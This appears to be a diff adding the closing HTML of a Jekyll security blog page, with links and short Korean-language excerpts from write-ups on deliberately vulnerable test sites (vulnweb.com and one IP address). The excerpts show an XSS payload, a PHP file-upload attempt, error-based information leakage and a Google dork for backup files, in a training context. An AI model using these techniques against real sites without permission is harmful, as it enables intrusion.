+      <a href="/vulnwebs_writeup/VulnWebs-testasp.vulnweb.com/" class="pagination--pager" title="[ VulnWebs ] - testasp.vulnweb.com
+">Previous</a>
+    
+    
+      <a href="/vulnwebs_writeup/VulnWebs-testhtml5.vulnweb.com/" class="pagination--pager" title="[ VulnWebs ] - testhtml5.vulnweb.com
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-x.x.137.97/" rel="permalink">[ VulnWebs ] - x.x.137.97
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">RECON
+
+OS: CentOS
+WAS: Apache/2.4.6
+Lang: PHP/7.2.34
+
+File Upload
+업로드 페이지가 존재하며
+http://x.x.137.97/upload.php
+
+
+
+확장자 ‘.php’를 가지는 php코드 파일을 업로드 시도
+import reque...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testhtml5.vulnweb.com/" rel="permalink">[ VulnWebs ] - testhtml5.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+
+WAS: Nginx/1.19.0
+
+
+XSS
+
+로그인 페이지에서
+http://testhtml5.vulnweb.com/#/popular
+
+스크립트 구문으로 로그인 하면
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+
+...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testasp.vulnweb.com/" rel="permalink">[ VulnWebs ] - testasp.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+
+
+OS: Windows Server
+WAS: Microsoft-IIS/8.5
+Lang: ASP.NET
+
+Information Leakage
+임의값을 전송하여 서버 에러를 유발시켜 서버 정보를 노출시킴
+http://testasp.vulnweb.com/showfor...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testphp.vulnweb.com/" rel="permalink">[ VulnWebs ] - testphp.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+PHP 5.6.40
+Nginx
+Ubuntu
+
+
+
+Position Leakage
+Position Leakage-1
+Google Dork을 통해 ‘백업 파일’을 검색
+site:testphp.vulnweb.com intext:"bak"
+
+
+
+‘pictures’ 디렉토리...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 A1mH1gh. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
